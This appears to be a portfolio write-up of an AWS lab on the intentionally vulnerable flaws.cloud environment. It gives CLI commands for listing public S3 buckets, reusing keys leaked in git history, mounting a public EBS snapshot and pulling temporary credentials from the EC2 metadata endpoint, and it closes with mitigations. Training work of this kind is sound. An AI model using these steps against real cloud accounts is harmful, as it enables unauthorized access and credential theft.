# ☁️ AWS Cloud Exploitation – flaws.cloud Vulnerable Environment

This project demonstrates the exploitation of common **AWS cloud security misconfigurations** within the intentionally vulnerable `flaws.cloud` environment. Through a multi-stage hands-on lab, I performed reconnaissance, storage enumeration, credential harvesting, privilege escalation, and API gateway exploitation. The workflow highlights real-world attack paths and emphasizes the importance of securing cloud assets against misconfiguration-based threats. <!-- filecite24:0 -->

![intro](/cybersecurity-portforlio/assets/Flaws_AWS/intro.png)
---

## 📌 Objective

- Perform DNS reconnaissance to identify cloud resources.
- Enumerate misconfigured public **S3 buckets** (unauthenticated and authenticated).
- Analyze leaked credentials from version control artifacts.
- Exploit publicly available **EC2 snapshots** to recover sensitive data.
- Abuse **EC2 metadata services** for privilege escalation.
- Explore IAM policies and API Gateway integrations for hidden functionality.
- Gain insight into real-world AWS misconfigurations and attack paths. <!-- filecite24:0 -->

---

## 🛠️ Lab Environment

| Role        | System / Service                   | Notes                                                |
|-------------|------------------------------------|------------------------------------------------------|
| 🎯 Target    | flaws.cloud AWS environment        | Intentionally vulnerable AWS environment             |
| 🧑‍💻 Attacker | Kali Linux + AWS CLI              | Used for enumeration and exploitation                 |
| 🔑 Identity  | CLI IAM user (`cli-me`)            | Provisioned with AdminAccess for lab purposes        |
| 📦 Storage   | S3 Buckets                         | Levels 1–3 exploitation paths                        |
| 💾 Compute   | EC2 Instances + Snapshots          | Exploited in Level 4–5                               |
| ⚙️ IAM       | Custom policies + roles            | Leveraged for privilege escalation in Level 6        |

---

## 🧨 Vulnerability Summary

- **Exposed DNS entries** leaked bucket and service identifiers.
- **Publicly accessible S3 buckets** contained sensitive data and progression hints.
- **Version control artifacts** stored in S3 buckets exposed AWS access keys.
- **Unrestricted EC2 snapshots** allowed mounting volumes to extract credentials.
- **Exposed EC2 metadata** enabled retrieval of temporary credentials.
- **Over-permissive IAM policies** allowed API Gateway + Lambda discovery and abuse. <!-- filecite24:0 -->

---

## 🧭 Exploitation Walkthrough

### 🔎 Level 1 – DNS Recon & Public S3 Enumeration
Performed DNS lookups against `flaws.cloud`:
```bash
dig flaws.cloud
nslookup flaws.cloud
host flaws.cloud
dig +short -x <ip>
```
Discovered public bucket:
```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request
```
Revealed content and hints leading to Level 2. <!-- filecite24:0 -->

---

### 🔑 Level 2 – Authenticated Bucket Access
With the configured `cli-me` profile:
```bash
aws s3 ls s3://level2-<hash>.flaws.cloud --profile cli-me
```
Confirmed access to restricted buckets. <!-- filecite24:0 -->

---

### 🗝️ Level 3 – Leaked Git Credentials
Downloaded S3 content containing `.git` artifacts:
```bash
aws s3 sync s3://level3-<hash>.flaws.cloud ./level3-download --profile cli-me
git log
git show <commit>
```
Recovered `access_keys.txt`, then configured a new AWS profile with leaked keys:
```bash
aws configure --profile leakkeyss
aws --profile leakkeyss s3 ls
```
Granted access to remaining levels. <!-- filecite24:0 -->

---

### 💾 Level 4 – Public EC2 Snapshot Analysis
- Retrieved AWS Account ID with leaked keys:
```bash
aws --profile leakkeyss sts get-caller-identity
```
- Discovered and mounted a **public EBS snapshot** in `us-west-2`.
- Created and attached snapshot volume to personal EC2 instance.
- Mounted the volume and found `setupNginx.sh` revealing **hardcoded credentials** for Level 5. <!-- filecite24:0 -->

---

### 🛠️ Level 5 – EC2 Metadata Exploitation
- Accessed target web application proxying EC2 metadata service.
- Extracted temporary AWS credentials using `curl http://169.254.169.254/latest/meta-data/`.
- Configured new profile `flaw6` with stolen tokens.
- Access granted to Level 6 bucket. <!-- filecite24:0 -->

---

### ⚙️ Level 6 – IAM Policy Abuse & API Gateway Discovery
- Inspected IAM policies attached to stolen role:
```bash
aws --profile level6 iam get-policy-version --policy-arn arn:aws:iam::<account-id>:policy/list_apigateways --version-id v4
```
- Confirmed ability to invoke API Gateway endpoints and list Lambda functions:
```bash
aws --region us-west-2 --profile level6 lambda list-functions
aws --region us-west-2 --profile level6 lambda get-policy --function-name Level6
aws --profile level6 --region us-west-2 apigateway get-stages --rest-api-id s33ppypa75
```
- Successfully chained IAM + API Gateway permissions to escalate and access hidden resources. <!-- filecite24:0 -->

---

## ⚠️ Impact

- **Data Exposure:** Public buckets exposed sensitive data including credentials.
- **Persistence Risks:** Exposed snapshots can be replicated and mounted by attackers.
- **Privilege Escalation:** Metadata exploitation provided attacker-controlled credentials.
- **Lateral Movement:** IAM policy abuse enabled API discovery and resource invocation.
- **Cloud Takeover Potential:** Combined flaws provided a full attack chain from recon to privilege escalation. <!-- filecite24:0 -->

---

## 🔒 Mitigation Recommendations

- Restrict S3 bucket policies to enforce least privilege and disable public access.
- Enforce MFA and rotate IAM keys; never commit credentials to repositories.
- Audit and restrict EBS snapshot permissions to prevent public exposure.
- Harden EC2 instances by disabling metadata v1 and enforcing IMDSv2.
- Continuously audit IAM roles and policies for privilege escalation paths.
- Apply security monitoring with GuardDuty, CloudTrail, and Config to detect misuses. <!-- filecite24:0 -->

---

## 🖼️ POC


![S3 Enumeration](/cybersecurity-portforlio/assets/Flaws_AWS/s3-enum.png)
![leaked credentials](/cybersecurity-portforlio/assets/Flaws_AWS/git.png)
![EC2 Snapshot Mount](/cybersecurity-portforlio/assets/Flaws_AWS/ec2-volume.png)
![Metadata Exploit](/cybersecurity-portforlio/assets/Flaws_AWS/metadata.png)

---

## 📄 Full Report

📥[Download the full report](/cybersecurity-portforlio/Flaws_AWS/Flaws_AWS.pdf)

This PDF contains step-by-step details, screenshots, and command outputs.

---

> _"Cloud misconfigurations are the low-hanging fruit for attackers—secure them before someone else does."_  
> — Alvin Okiya

[![✔ BACK](https://img.shields.io/badge/BACK_TO_PORTFOLIO-Click_Here-green?logo=github)](/README.md)
